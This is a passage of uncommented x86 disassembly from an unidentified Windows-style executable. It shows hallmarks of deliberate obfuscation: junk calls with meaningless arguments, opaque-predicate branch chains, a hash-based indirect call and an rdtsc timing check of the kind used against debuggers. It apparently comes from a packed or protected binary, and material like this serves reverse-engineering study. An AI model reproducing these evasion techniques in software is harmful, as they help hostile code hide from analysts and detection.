  406ada:	sub    DWORD PTR [ebp-0x5c],esi
  406add:	add    ecx,eax
  406adf:	cmp    ecx,DWORD PTR [ebp-0x68]
  406ae2:	je     0x406ae7
  406ae4:	add    DWORD PTR [ebp-0x5c],ecx
  406ae7:	push   DWORD PTR [ebp-0x24]
  406aea:	push   0xa0e897e2
  406aef:	push   DWORD PTR [ebp-0x1c]
  406af2:	call   eax
  406af4:	mov    edx,0xec
  406af9:	and    edx,eax
  406afb:	push   0xffffffad
  406afd:	push   0xffffff9c
  406aff:	call   0x408020
  406b04:	add    esp,0x8
  406b07:	call   0x4080ed
  406b0c:	add    DWORD PTR [ebp-0x1c],0x1f
  406b13:	sub    esi,ebx
  406b15:	push   0x3f
  406b17:	push   0x8226c000
  406b1c:	push   0x8b68400
  406b21:	push   0xffffffe6
  406b23:	call   0x408020
  406b28:	add    esp,0x10
  406b2b:	sub    esi,eax
  406b2d:	push   0xffffffb7
  406b2f:	push   0x42012800
  406b34:	push   0xffffff94
  406b36:	push   0xd668da00
  406b3b:	call   0x408379
  406b40:	add    esp,0x10
  406b43:	push   0xb8d6f800
  406b48:	push   0xffffffdb
  406b4a:	push   0x32af1900
  406b4f:	call   0x408020
  406b54:	add    esp,0xc
  406b57:	xor    ecx,ecx
  406b59:	add    DWORD PTR [ebp-0x5c],esi
  406b5c:	push   0x37
  406b5e:	push   0x38f97300
  406b63:	push   0xffffffb7
  406b65:	call   0x408020
  406b6a:	add    esp,0xc
  406b6d:	mov    esi,DWORD PTR [ebp-0x1c]
  406b70:	add    ebx,ebx
  406b72:	cmp    ebx,0x60
  406b75:	jne    0x406bc4
  406b77:	call   0x4080ed
  406b7c:	push   0x562caf00
  406b81:	call   0x408020
  406b86:	add    esp,0x4
  406b89:	push   0xffffff9e
  406b8b:	call   0x4080ed
  406b90:	add    esp,0x4
  406b93:	mov    eax,DWORD PTR [ebp-0x5c]
  406b96:	mov    edx,DWORD PTR [ebp-0x5c]
  406b99:	push   0xb8aa5700
  406b9e:	push   0xb8b94100
  406ba3:	call   0x408633
  406ba8:	add    esp,0x8
  406bab:	push   0x92349a00
  406bb0:	push   0x5e166500
  406bb5:	push   0xffffff81
  406bb7:	push   0x1
  406bb9:	call   0x4080ed
  406bbe:	add    esp,0x10
  406bc1:	sub    DWORD PTR [ebp-0x5c],ebx
  406bc4:	push   0xfffffffe
  406bc6:	push   0xf8d7bb00
  406bcb:	call   0x408020
  406bd0:	add    esp,0x8
  406bd3:	call   esi
  406bd5:	and    esi,eax
  406bd7:	push   0xda0fb400
  406bdc:	push   0x63
  406bde:	push   0xeaaab500
  406be3:	push   0x5f
  406be5:	call   0x408379
  406bea:	add    esp,0x10
  406bed:	mov    edx,DWORD PTR [ebp-0x5c]
  406bf0:	push   0x58
  406bf2:	push   0x965dc800
  406bf7:	push   0x7e6df100
  406bfc:	call   0x408379
  406c01:	add    esp,0xc
  406c04:	xor    edi,edi
  406c06:	push   0x5e67c400
  406c0b:	push   0x68a4fb00
  406c10:	push   0xeaa41e00
  406c15:	push   0x68
  406c17:	call   0x4080ed
  406c1c:	add    esp,0x10
  406c1f:	push   0x50
  406c21:	push   0xfffffff6
  406c23:	push   0x4d
  406c25:	push   0x68a2ea00
  406c2a:	call   0x408379
  406c2f:	add    esp,0x10
  406c32:	sub    DWORD PTR [ebp-0x5c],esi
  406c35:	push   0x8b4ff00
  406c3a:	push   0x75
  406c3c:	push   0xd2615300
  406c41:	push   0x40
  406c43:	call   0x4080ed
  406c48:	add    esp,0x10
  406c4b:	push   0xffffff9c
  406c4d:	push   0xffffffe3
  406c4f:	push   0xf8d4b100
  406c54:	push   0x39
  406c56:	call   0x408020
  406c5b:	add    esp,0x10
  406c5e:	push   0xa8aa9200
  406c63:	call   0x408379
  406c68:	add    esp,0x4
  406c6b:	push   0xffffffd4
  406c6d:	push   0xffffffcb
  406c6f:	push   0x68819900
  406c74:	push   0x7a4e0700
  406c79:	call   0x408020
  406c7e:	add    esp,0x10
  406c81:	push   0xde34bd00
  406c86:	push   0x5f
  406c88:	push   0x8e434400
  406c8d:	push   0x13
  406c8f:	push   0x92531200
  406c94:	call   0x408020
  406c99:	add    esp,0x14
  406c9c:	push   0xcac8d500
  406ca1:	push   0x9a5c5900
  406ca6:	push   0x22
  406ca8:	call   0x408379
  406cad:	add    esp,0xc
  406cb0:	push   0xb8ca2e00
  406cb5:	push   0x4b
  406cb7:	call   0x408379
  406cbc:	add    esp,0x8
  406cbf:	push   0xffffff92
  406cc1:	call   0x4080ed
  406cc6:	add    esp,0x4
  406cc9:	push   0xb2a1b500
  406cce:	call   0x408633
  406cd3:	add    esp,0x4
  406cd6:	push   0xe893d600
  406cdb:	call   0x408633
  406ce0:	add    esp,0x4
  406ce3:	sub    DWORD PTR [ebp-0x5c],edi
  406ce6:	push   0xc6649800
  406ceb:	push   0xffffff80
  406ced:	call   0x408020
  406cf2:	add    esp,0x8
  406cf5:	push   0x7f
  406cf7:	push   0x88854a00
  406cfc:	push   0x2d
  406cfe:	push   0x98c9ef00
  406d03:	call   0x408633
  406d08:	add    esp,0x10
  406d0b:	call   0x408633
  406d10:	add    edi,esi
  406d12:	push   0x5276b800
  406d17:	push   0x54
  406d19:	push   0xffffffa4
  406d1b:	push   0x71
  406d1d:	call   0x4080ed
  406d22:	add    esp,0x10
  406d25:	add    edi,eax
  406d27:	add    edi,esi
  406d29:	sub    DWORD PTR [ebp-0x5c],edi
  406d2c:	call   0x408020
  406d31:	push   0x289f2200
  406d36:	push   0xffffffff
  406d38:	call   0x408020
  406d3d:	add    esp,0x8
  406d40:	mov    edi,0xda
  406d45:	mov    eax,DWORD PTR [ebp-0x5c]
  406d48:	call   0x408020
  406d4d:	sub    DWORD PTR [ebp-0x5c],edi
  406d50:	push   0xfffffff7
  406d52:	call   0x408379
  406d57:	add    esp,0x4
  406d5a:	add    DWORD PTR [ebp-0x5c],eax
  406d5d:	pop    edi
  406d5e:	mov    esi,DWORD PTR [ebp-0x5c]
  406d61:	cmp    edi,DWORD PTR ds:0x43407c
  406d67:	jne    0x406e21
  406d6d:	xor    eax,eax
  406d6f:	mov    edx,DWORD PTR [ebp-0x5c]
  406d72:	cmp    edi,DWORD PTR [ebp-0x10]
  406d75:	jne    0x406e21
  406d7b:	xor    ecx,ecx
  406d7d:	add    DWORD PTR [ebp-0x5c],eax
  406d80:	call   0x408379
  406d85:	push   0xb2a96100
  406d8a:	call   0x408633
  406d8f:	add    esp,0x4
  406d92:	cmp    edi,DWORD PTR ds:0x43405c
  406d98:	je     0x406e21
  406d9e:	mov    ecx,0x95ed
  406da3:	push   0x8a7e6800
  406da8:	push   0xffffff91
  406daa:	call   0x408020
  406daf:	add    esp,0x8
  406db2:	mov    ecx,ebx
  406db4:	test   ebx,0xba
  406dba:	jne    0x406e21
  406dbc:	push   0xffffff8d
  406dbe:	push   0xffffffee
  406dc0:	push   0xf8e1bd00
  406dc5:	push   0x68
  406dc7:	call   0x408020
  406dcc:	add    esp,0x10
  406dcf:	push   0xfa3a5900
  406dd4:	push   0xfffffff7
  406dd6:	push   0x7b
  406dd8:	push   0x8a7f8700
  406ddd:	call   0x4080ed
  406de2:	add    esp,0x10
  406de5:	push   0xc22c7d00
  406dea:	push   0x32971400
  406def:	push   0xb2b09f00
  406df4:	push   0xffffff93
  406df6:	push   0xf2a60500
  406dfb:	call   0x408633
  406e00:	add    esp,0x14
  406e03:	push   0xeaa63d00
  406e08:	call   0x408379
  406e0d:	add    esp,0x4
  406e10:	sub    esi,eax
  406e12:	push   0xffffffdf
  406e14:	push   0xc
  406e16:	call   0x408633
  406e1b:	add    esp,0x8
  406e1e:	sub    DWORD PTR [ebp-0x5c],esi
  406e21:	pop    esi
  406e22:	push   0x66
  406e24:	push   0xc8d60000
  406e29:	push   0x689be800
  406e2e:	call   0x408379
  406e33:	add    esp,0xc
  406e36:	pop    ebx
  406e37:	mov    eax,0x4c
  406e3c:	call   0x408633
  406e41:	push   0x16323800
  406e46:	push   0x28ebf800
  406e4b:	push   0x3e41d800
  406e50:	push   0xfffffffb
  406e52:	push   0x489c9200
  406e57:	call   0x408379
  406e5c:	add    esp,0x14
  406e5f:	leave  
  406e60:	ret    
  406e61:	int3   
  406e62:	int3   
  406e63:	int3   
  406e64:	int3   
  406e65:	int3   
  406e66:	push   ebp
  406e67:	mov    ebp,esp
  406e69:	sub    esp,0x48
  406e6c:	push   0xa575c00
  406e71:	push   0xa27fb200
  406e76:	call   0x408633
  406e7b:	add    esp,0x8
  406e7e:	push   0x28a1cf00
  406e83:	push   0x7d
  406e85:	push   0xd8b72700
  406e8a:	push   0xffffffed
  406e8c:	call   0x4080ed
  406e91:	add    esp,0x10
  406e94:	push   ebx
  406e95:	push   0x8bd9a00
  406e9a:	push   0xe2558e00
  406e9f:	push   0xe2191800
  406ea4:	call   0x408633
  406ea9:	add    esp,0xc
  406eac:	push   esi
  406ead:	mov    eax,0x69
  406eb2:	push   0x5e
  406eb4:	push   0x7d
  406eb6:	push   0xffffff9c
  406eb8:	push   0xffffffe5
  406eba:	call   0x408020
  406ebf:	add    esp,0x10
  406ec2:	push   edi
  406ec3:	push   0xfffffffd
  406ec5:	push   0x566fe800
  406eca:	push   0x8
  406ecc:	call   0x408633
  406ed1:	add    esp,0xc
  406ed4:	push   0x32885100
  406ed9:	push   0x22059900
  406ede:	call   0x408633
  406ee3:	add    esp,0x8
  406ee6:	call   0x408633
  406eeb:	mov    DWORD PTR [ebp-0x1c],0xeaaee72
  406ef2:	mov    edi,DWORD PTR ds:0x434064
  406ef8:	xor    eax,eax
  406efa:	push   0x51
  406efc:	push   0x3
  406efe:	push   0x28f01700
  406f03:	push   0xba38ed00
  406f08:	call   0x4080ed
  406f0d:	add    esp,0x10
  406f10:	push   0xffffff9d
  406f12:	push   0x48ddde00
  406f17:	push   0xffffff80
  406f19:	call   0x4080ed
  406f1e:	add    esp,0xc
  406f21:	add    edi,eax
  406f23:	test   edi,0xb
  406f29:	jne    0x407040
  406f2f:	cmp    edi,0xffffffbe
  406f32:	jne    0x407040
  406f38:	mov    ecx,DWORD PTR ds:0x434040
  406f3e:	push   0xffffffa3
  406f40:	push   0xffffffec
  406f42:	push   0x76623c00
  406f47:	call   0x408379
  406f4c:	add    esp,0xc
  406f4f:	push   0xffffffb8
  406f51:	push   0xffffffbb
  406f53:	push   0x62
  406f55:	call   0x4080ed
  406f5a:	add    esp,0xc
  406f5d:	or     edi,eax
  406f5f:	push   0x72c15b00
  406f64:	push   0x28e07800
  406f69:	push   0x24
  406f6b:	push   0x827fd500
  406f70:	push   0x37
  406f72:	call   0x408379
  406f77:	add    esp,0x14
  406f7a:	call   0x408379
  406f7f:	push   0x4aa37400
  406f84:	push   0x88c9a000
  406f89:	push   0xa8d68c00
  406f8e:	call   0x408020
  406f93:	add    esp,0xc
  406f96:	mov    eax,0x57
  406f9b:	mov    DWORD PTR [ebp-0x34],eax
  406f9e:	push   0xffffffe1
  406fa0:	push   0xe8f27200
  406fa5:	push   0x61
  406fa7:	call   0x408379
  406fac:	add    esp,0xc
  406faf:	push   0xd8b53e00
  406fb4:	push   0x72842000
  406fb9:	push   0x92724d00
  406fbe:	call   0x408379
  406fc3:	add    esp,0xc
  406fc6:	push   0xfffffffd
  406fc8:	push   0x4
  406fca:	push   0x58d98d00
  406fcf:	push   0x12
  406fd1:	call   0x408020
  406fd6:	add    esp,0x10
  406fd9:	add    DWORD PTR [ebp-0x34],eax
  406fdc:	cmp    eax,DWORD PTR [ebp-0x10]
  406fdf:	je     0x407040
  406fe1:	test   edi,0x6c
  406fe7:	jne    0x407040
  406fe9:	mov    edx,DWORD PTR [ebp-0x34]
  406fec:	mov    ebx,DWORD PTR [ebp-0x34]
  406fef:	mov    DWORD PTR [ebp-0x34],ebx
  406ff2:	push   0x4afb2000
  406ff7:	push   0x24
  406ff9:	push   0xe2710600
  406ffe:	push   0xffffffc2
  407000:	push   0x52
  407002:	call   0x408633
  407007:	add    esp,0x14
  40700a:	sub    edi,ebx
  40700c:	push   0xd
  40700e:	push   0xa8f2d100
  407013:	push   0x826f2400
  407018:	call   0x408020
  40701d:	add    esp,0xc
  407020:	call   0x408379
  407025:	push   0xb2628d00
  40702a:	push   0xfffffff5
  40702c:	push   0xffffffb2
  40702e:	push   0x1d
  407030:	push   0x18da4800
  407035:	call   0x408633
  40703a:	add    esp,0x14
  40703d:	add    DWORD PTR [ebp-0x34],edi
  407040:	push   0xead2d000
  407045:	push   0xce63bf00
  40704a:	push   0x60d2300
  40704f:	call   0x408020
  407054:	add    esp,0xc
  407057:	call   0x407572
  40705c:	mov    esi,0xfc
  407061:	add    esi,edi
  407063:	mov    DWORD PTR [ebp-0x48],esi
  407066:	mov    DWORD PTR [ebp-0x28],eax
  407069:	push   0x22093d00
  40706e:	push   0xbe328f00
  407073:	push   0x72851200
  407078:	push   0x5e2bcf00
  40707d:	call   0x408379
  407082:	add    esp,0x10
  407085:	call   0x407572
  40708a:	cmp    ebx,esi
  40708c:	jne    0x407093
  40708e:	add    esi,ebx
  407090:	mov    DWORD PTR [ebp-0x48],esi
  407093:	mov    DWORD PTR [ebp-0x24],eax
  407096:	sub    eax,ebx
  407098:	add    DWORD PTR [ebp-0x48],eax
  40709b:	call   0x407572
  4070a0:	mov    edx,eax
  4070a2:	mov    esi,DWORD PTR [ebp-0x48]
  4070a5:	sub    esi,ebx
  4070a7:	add    edx,edi
  4070a9:	cmp    edi,0xb8f6
  4070af:	jne    0x407159
  4070b5:	cmp    ebx,DWORD PTR ds:0x434040
  4070bb:	je     0x407159
  4070c1:	cmp    edx,0xcf21
  4070c7:	je     0x407159
  4070cd:	test   edx,0xaf67
  4070d3:	jne    0x407159
  4070d9:	mov    ecx,DWORD PTR [ebp-0x48]
  4070dc:	cmp    edx,DWORD PTR ds:0x434064
  4070e2:	je     0x407159
  4070e4:	mov    ebx,0x2020000
  4070e9:	sub    DWORD PTR [ebp-0x48],edx
  4070ec:	cmp    esi,DWORD PTR [ebp-0x10]
  4070ef:	je     0x407159
  4070f1:	mov    edx,DWORD PTR [ebp-0x48]
  4070f4:	and    DWORD PTR [ebp-0x48],eax
  4070f7:	add    DWORD PTR [ebp-0x48],ebx
  4070fa:	cmp    ecx,0x2f
  4070fd:	jne    0x407159
  4070ff:	mov    edi,0x4
  407104:	cmp    edx,esi
  407106:	je     0x407159
  407108:	mov    DWORD PTR [ebp-0x48],esi
  40710b:	mov    esi,DWORD PTR [ebp-0x48]
  40710e:	cmp    ecx,0x54
  407111:	je     0x407159
  407113:	cmp    edx,0x0
  407116:	jne    0x407159
  407118:	or     ecx,eax
  40711a:	mov    ebx,DWORD PTR [ebp-0x48]
  40711d:	cmp    esi,0xffffffa1
  407120:	je     0x407159
  407122:	sub    edi,ebx
  407124:	mov    ebx,DWORD PTR ds:0x434084
  40712a:	add    DWORD PTR [ebp-0x48],ecx
  40712d:	cmp    esi,0x3c62
  407133:	jne    0x407159
  407135:	sub    DWORD PTR [ebp-0x48],edi
  407138:	test   eax,0xd2
  40713d:	je     0x407159
  40713f:	add    DWORD PTR [ebp-0x48],ebx
  407142:	add    esi,edi
  407144:	mov    ebx,DWORD PTR [ebp-0x48]
  407147:	sub    edx,edi
  407149:	and    esi,eax
  40714b:	sub    ebx,edx
  40714d:	mov    ecx,ebx
  40714f:	and    esi,ecx
  407151:	cmp    esi,0x62
  407154:	jne    0x407159
  407156:	add    DWORD PTR [ebp-0x48],esi
  407159:	mov    DWORD PTR [ebp-0x2c],eax
  40715c:	call   0x408020
  407161:	push   0x2a
  407163:	push   0xb2882800
  407168:	call   0x408020
  40716d:	add    esp,0x8
  407170:	mov    ecx,DWORD PTR [ebp-0x24]
  407173:	cmp    ecx,DWORD PTR ds:0x434084
  407179:	je     0x40717e
  40717b:	sub    DWORD PTR [ebp-0x48],ecx
  40717e:	sub    ecx,DWORD PTR [ebp-0x28]
  407181:	mov    eax,esi
  407183:	cmp    ecx,eax
  407185:	jne    0x4071ee
  407187:	add    eax,ecx
  407189:	mov    edx,0x78
  40718e:	mov    edi,DWORD PTR [ebp-0x48]
  407191:	sub    DWORD PTR [ebp-0x48],edi
  407194:	and    edx,edi
  407196:	add    eax,eax
  407198:	add    eax,ecx
  40719a:	mov    DWORD PTR [ebp-0x48],eax
  40719d:	cmp    edx,0xb
  4071a0:	je     0x4071ee
  4071a2:	and    edx,esi
  4071a4:	mov    eax,DWORD PTR [ebp-0x48]
  4071a7:	mov    edi,DWORD PTR [ebp-0x48]
  4071aa:	cmp    eax,DWORD PTR [ebp-0x18]
  4071ad:	jne    0x4071ee
  4071af:	mov    esi,0x31
  4071b4:	mov    ebx,DWORD PTR [ebp-0x48]
  4071b7:	cmp    edx,0xffffffa9
  4071ba:	jne    0x4071ee
  4071bc:	cmp    eax,DWORD PTR ds:0x434084
  4071c2:	jne    0x4071ee
  4071c4:	add    DWORD PTR [ebp-0x48],esi
  4071c7:	mov    esi,DWORD PTR [ebp-0x48]
  4071ca:	sub    DWORD PTR [ebp-0x48],edi
  4071cd:	and    DWORD PTR [ebp-0x48],eax
  4071d0:	sub    DWORD PTR [ebp-0x48],ebx
  4071d3:	sub    edx,eax
  4071d5:	cmp    edx,ebx
  4071d7:	je     0x4071ee
  4071d9:	cmp    edx,DWORD PTR [ebp-0x3c]
  4071dc:	jne    0x4071ee
  4071de:	mov    eax,ecx
  4071e0:	mov    ebx,DWORD PTR [ebp-0x48]
  4071e3:	sub    DWORD PTR [ebp-0x48],eax
  4071e6:	add    edx,esi
  4071e8:	add    DWORD PTR [ebp-0x48],edx
  4071eb:	add    DWORD PTR [ebp-0x48],ebx
  4071ee:	xor    ecx,0x32622a57
  4071f4:	mov    eax,0xcc
  4071f9:	sub    DWORD PTR [ebp-0x48],ecx
  4071fc:	mov    edx,DWORD PTR [ebp-0x48]
  4071ff:	test   edx,0xb1
  407205:	je     0x4072c4
  40720b:	mov    ebx,DWORD PTR [ebp-0x48]
  40720e:	or     DWORD PTR [ebp-0x48],edx
  407211:	sub    DWORD PTR [ebp-0x48],ebx
  407214:	sub    eax,edx
  407216:	mov    esi,0xc0
  40721b:	sub    eax,ebx
  40721d:	sub    esi,edi
  40721f:	sub    DWORD PTR [ebp-0x48],edx
  407222:	xor    DWORD PTR [ebp-0x48],ebx
  407225:	xor    DWORD PTR [ebp-0x48],edx
  407228:	or     eax,ebx
  40722a:	add    DWORD PTR [ebp-0x48],eax
  40722d:	cmp    esi,DWORD PTR [ebp-0x38]
  407230:	jne    0x4072c4
  407236:	mov    edi,DWORD PTR [ebp-0x48]
  407239:	cmp    esi,0x44
  40723c:	je     0x4072c4
  407242:	mov    edx,DWORD PTR ds:0x434040
  407248:	or     DWORD PTR [ebp-0x48],edx
  40724b:	cmp    edi,0x2e
  40724e:	jne    0x4072c4
  407250:	sub    DWORD PTR [ebp-0x48],edi
  407253:	mov    edi,DWORD PTR [ebp-0x48]
  407256:	cmp    eax,0x4d
  407259:	jne    0x4072c4
  40725b:	sub    DWORD PTR [ebp-0x48],edi
  40725e:	mov    edi,DWORD PTR [ebp-0x48]
  407261:	sub    DWORD PTR [ebp-0x48],eax
  407264:	cmp    esi,0xffffff92
  407267:	jne    0x4072c4
  407269:	add    esi,ecx
  40726b:	mov    eax,0x83
  407270:	mov    edx,DWORD PTR [ebp-0x48]
  407273:	xor    DWORD PTR [ebp-0x48],eax
  407276:	add    esi,ecx
  407278:	sub    edx,eax
  40727a:	sub    esi,ebx
  40727c:	or     DWORD PTR [ebp-0x48],eax
  40727f:	cmp    edi,DWORD PTR ds:0x434064
  407285:	je     0x4072c4
  407287:	cmp    edx,DWORD PTR [ebp-0x20]
  40728a:	jne    0x4072c4
  40728c:	cmp    edx,DWORD PTR ds:0x434064
  407292:	jne    0x4072c4
  407294:	mov    ebx,DWORD PTR [ebp-0x48]
  407297:	sub    DWORD PTR [ebp-0x48],edx
  40729a:	mov    eax,0xcb
  40729f:	add    esi,ecx
  4072a1:	cmp    edx,DWORD PTR [ebp-0x18]
  4072a4:	jne    0x4072c4
  4072a6:	cmp    esi,DWORD PTR [ebp-0x14]
  4072a9:	je     0x4072c4
  4072ab:	add    DWORD PTR [ebp-0x48],eax
  4072ae:	mov    eax,edi
  4072b0:	mov    edx,0x96
  4072b5:	or     esi,ecx
  4072b7:	mov    DWORD PTR [ebp-0x48],edx
  4072ba:	sub    eax,ebx
  4072bc:	add    esi,ebx
  4072be:	sub    DWORD PTR [ebp-0x48],esi
  4072c1:	add    DWORD PTR [ebp-0x48],eax
  4072c4:	mov    edi,DWORD PTR [ebp-0x2c]
  4072c7:	sub    DWORD PTR [ebp-0x48],edi
  4072ca:	sub    edi,DWORD PTR [ebp-0x24]
  4072cd:	xor    DWORD PTR [ebp-0x48],edi
  4072d0:	xor    edi,0x32622a52
  4072d6:	test   edi,0xc9c8
  4072dc:	je     0x4072e1
  4072de:	add    DWORD PTR [ebp-0x48],edi
  4072e1:	cmp    ecx,edi
  4072e3:	je     0x4074c4
  4072e9:	push   0xe20fa700
  4072ee:	push   0xffffff8a
  4072f0:	push   0xcab2d900
  4072f5:	call   0x408020
  4072fa:	add    esp,0xc
  4072fd:	push   0xf60b9400
  407302:	push   0x6e68e600
  407307:	push   0xffffffa3
  407309:	push   0xffffffba
  40730b:	push   0x48
  40730d:	call   0x408633
  407312:	add    esp,0x14
  407315:	push   0x434064
  40731a:	call   DWORD PTR ds:0x41320c
  407320:	mov    esi,edi
  407322:	sub    esi,edi
  407324:	mov    edx,0x8
  407329:	and    edx,eax
  40732b:	sub    DWORD PTR [ebp-0x48],edx
  40732e:	add    DWORD PTR [ebp-0x48],esi
  407331:	or     eax,eax
  407333:	je     0x4074c4
  407339:	xor    DWORD PTR [ebp-0x48],edi
  40733c:	add    DWORD PTR [ebp-0x1c],0xe83fd907
  407343:	sub    DWORD PTR [ebp-0x48],eax
  407346:	lea    ebx,[eax+0x8f1]
  40734c:	call   0x408633
  407351:	push   0xffffff9d
  407353:	call   0x408020
  407358:	add    esp,0x4
  40735b:	inc    ebx
  40735c:	mov    edi,DWORD PTR [ebp-0x48]
  40735f:	push   0x3c
  407361:	push   0xd8b3b400
  407366:	call   0x4080ed
  40736b:	add    esp,0x8
  40736e:	push   0x58d82300
  407373:	push   0x6274e300
  407378:	call   0x408633
  40737d:	add    esp,0x8
  407380:	push   0xf25ded00
  407385:	push   0x72e33100
  40738a:	push   0x9a216400
  40738f:	push   0x68f4f900
  407394:	call   0x408633
  407399:	add    esp,0x10
  40739c:	push   0x72963700
  4073a1:	push   0xffffff84
  4073a3:	push   0xeadb2400
  4073a8:	call   0x408633
  4073ad:	add    esp,0xc
  4073b0:	mov    esi,DWORD PTR [ebp-0x48]
  4073b3:	push   0x8a80c00
  4073b8:	push   0xa661e00
  4073bd:	push   0x4267d300
  4073c2:	push   0xffffffc2
  4073c4:	call   0x408633
  4073c9:	add    esp,0x10
  4073cc:	cmp    edi,ebx
  4073ce:	jne    0x40745e
  4073d4:	mov    ecx,DWORD PTR [ebp-0x48]
  4073d7:	push   0xffffffab
  4073d9:	push   0x5f
  4073db:	call   0x408379
  4073e0:	add    esp,0x8
  4073e3:	sub    esi,eax
  4073e5:	push   0xffffff90
  4073e7:	push   0x16
  4073e9:	call   0x408020
  4073ee:	add    esp,0x8
  4073f1:	push   0xfffffffe
  4073f3:	push   0xfffffff3
  4073f5:	push   0x6f
  4073f7:	push   0x98870800
  4073fc:	call   0x408379
  407401:	add    esp,0x10
  407404:	push   0x49
  407406:	push   0xc88fc000
  40740b:	push   0xbe119500
  407410:	push   0x5b
  407412:	push   0xaa0c9000
  407417:	call   0x4080ed
  40741c:	add    esp,0x14
  40741f:	push   0x9669f200
  407424:	push   0xffffffbd
  407426:	call   0x4080ed
  40742b:	add    esp,0x8
  40742e:	sub    DWORD PTR [ebp-0x48],esi
  407431:	mov    eax,0x4f
  407436:	push   0x31
  407438:	push   0xbe091500
  40743d:	push   0x75
  40743f:	push   0xea0bed00
  407444:	call   0x4080ed
  407449:	add    esp,0x10
  40744c:	and    edi,eax
  40744e:	push   0x889f0900
  407453:	call   0x408379
  407458:	add    esp,0x4
  40745b:	add    DWORD PTR [ebp-0x48],edi
  40745e:	push   0x41
  407460:	push   0x58c47e00
  407465:	push   0x2073100
  40746a:	call   0x408633
  40746f:	add    esp,0xc
  407472:	mov    ecx,DWORD PTR [ebx]
  407474:	or     DWORD PTR [ebp-0x48],ecx
  407477:	sub    ecx,0xa855abec
  40747d:	mov    eax,ecx
  40747f:	mov    edx,DWORD PTR [ebp-0x48]
  407482:	add    DWORD PTR [ebp-0x48],eax
  407485:	cmp    edx,esi
  407487:	je     0x40748e
  407489:	and    edx,edi
  40748b:	add    DWORD PTR [ebp-0x48],edx
  40748e:	cmp    ecx,0x5ff04aeb
  407494:	jne    0x40734c
  40749a:	mov    eax,esi
  40749c:	cmp    eax,0xa
  40749f:	je     0x4074a6
  4074a1:	add    eax,ecx
  4074a3:	add    DWORD PTR [ebp-0x48],eax
  4074a6:	push   0xffffffc8
  4074a8:	call   0x4080ed
  4074ad:	add    esp,0x4
  4074b0:	mov    ecx,DWORD PTR [ebx+0x4]
  4074b3:	xor    ebx,ebx
  4074b5:	mov    eax,DWORD PTR [ebp-0x48]
  4074b8:	sub    DWORD PTR [ebp-0x48],ebx
  4074bb:	add    DWORD PTR [ebp-0x48],ecx
  4074be:	or     DWORD PTR [ebp-0x48],eax
  4074c1:	sub    DWORD PTR [ebp-0x1c],ecx
  4074c4:	push   0x41
  4074c6:	push   0x5e
  4074c8:	push   0x0
  4074ca:	push   0xffffff99
  4074cc:	push   0x44
  4074ce:	call   0x408379
  4074d3:	add    esp,0x14
  4074d6:	push   0xffffff8d
  4074d8:	push   0x8e752b00
  4074dd:	push   0x8e431700
  4074e2:	call   0x408379
  4074e7:	add    esp,0xc
  4074ea:	push   0x3f
  4074ec:	push   0x72d44800
  4074f1:	push   0xf2835400
  4074f6:	call   0x408020
  4074fb:	add    esp,0xc
  4074fe:	mov    esi,DWORD PTR [ebp+0xc]
  407501:	push   0xffffff9c
  407503:	call   0x408379
  407508:	add    esp,0x4
  40750b:	push   0x56
  40750d:	call   0x408633
  407512:	add    esp,0x4
  407515:	mov    edi,DWORD PTR [ebp-0x1c]
  407518:	xor    ecx,ecx
  40751a:	push   0x5c
  40751c:	push   0x2d
  40751e:	call   0x408020
  407523:	add    esp,0x8
  407526:	mov    DWORD PTR [esi+0x0],edi
  407529:	push   0xb2552000
  40752e:	push   0xe0ceb00
  407533:	push   0xffffffe5
  407535:	call   0x408379
  40753a:	add    esp,0xc
  40753d:	call   0x4080ed
  407542:	cmp    eax,0x55
  407545:	jne    0x40754a
  407547:	and    DWORD PTR [ebp-0x48],ebx
  40754a:	pop    edi
  40754b:	call   0x408633
  407550:	pop    esi
  407551:	push   0x2
  407553:	push   0xeabbac00
  407558:	call   0x408633
  40755d:	add    esp,0x8
  407560:	pop    ebx
  407561:	cmp    ebx,0xffffff92
  407564:	je     0x407569
  407566:	or     DWORD PTR [ebp-0x48],edi
  407569:	leave  
  40756a:	ret    0x8
  40756d:	int3   
  40756e:	int3   
  40756f:	int3   
  407570:	int3   
  407571:	int3   
  407572:	push   ebp
  407573:	mov    ebp,esp
  407575:	sub    esp,0x40
  407578:	push   0xffffff8a
  40757a:	push   0x27
  40757c:	push   0xffffff9a
  40757e:	push   0xffffffa9
  407580:	push   0x12293000
  407585:	call   0x4080ed
  40758a:	add    esp,0x14
  40758d:	push   ebx
  40758e:	mov    eax,0xef
  407593:	push   0x5c
  407595:	push   0xffffffd8
  407597:	push   0x7e
  407599:	call   0x408633
  40759e:	add    esp,0xc
  4075a1:	push   esi
  4075a2:	push   0xfffffff6
  4075a4:	push   0xc64fd900
  4075a9:	call   0x408020
  4075ae:	add    esp,0x8
  4075b1:	push   edi
  4075b2:	push   0xeaa89b00
  4075b7:	call   0x4080ed
  4075bc:	add    esp,0x4
  4075bf:	push   0xfffffff6
  4075c1:	push   0xffffffe0
  4075c3:	push   0x62
  4075c5:	push   0xffffffa9
  4075c7:	push   0x14
  4075c9:	call   0x408020
  4075ce:	add    esp,0x14
  4075d1:	mov    DWORD PTR [ebp-0x3c],eax
  4075d4:	call   0x408020
  4075d9:	rdtsc  
  4075db:	mov    edi,0x1653
  4075e0:	mov    esi,DWORD PTR [ebp-0x3c]
  4075e3:	test   esi,0x3d
  4075e9:	je     0x4075f2
  4075eb:	and    edi,esi
  4075ed:	and    edi,edx
  4075ef:	add    DWORD PTR [ebp-0x3c],edi
  4075f2:	add    esi,edi
  4075f4:	mov    edx,0xcc
  4075f9:	mov    ecx,DWORD PTR [ebp-0x3c]
  4075fc:	sub    ecx,eax
  4075fe:	or     edx,eax
  407600:	add    DWORD PTR [ebp-0x3c],eax
  407603:	add    ecx,eax
  407605:	sub    DWORD PTR [ebp-0x3c],ecx
  407608:	sub    edx,eax
  40760a:	add    DWORD PTR [ebp-0x3c],esi
  40760d:	sub    edx,esi
  40760f:	or     DWORD PTR [ebp-0x3c],edi
  407612:	cmp    edx,DWORD PTR [ebp-0x1c]
  407615:	jne    0x407654
  407617:	sub    edx,ecx
  407619:	mov    esi,DWORD PTR [ebp-0x3c]
  40761c:	cmp    edx,DWORD PTR [ebp-0x10]
  40761f:	jne    0x407654
  407621:	mov    ecx,DWORD PTR [ebp-0x3c]
  407624:	or     edx,edi
  407626:	mov    ebx,edi
  407628:	test   ecx,0x86fd
  40762e:	jne    0x407654
  407630:	cmp    esi,DWORD PTR [ebp-0xc]
  407633:	jne    0x407654
  407635:	sub    ebx,eax
  407637:	mov    edi,0x3e61
  40763c:	sub    DWORD PTR [ebp-0x3c],ecx
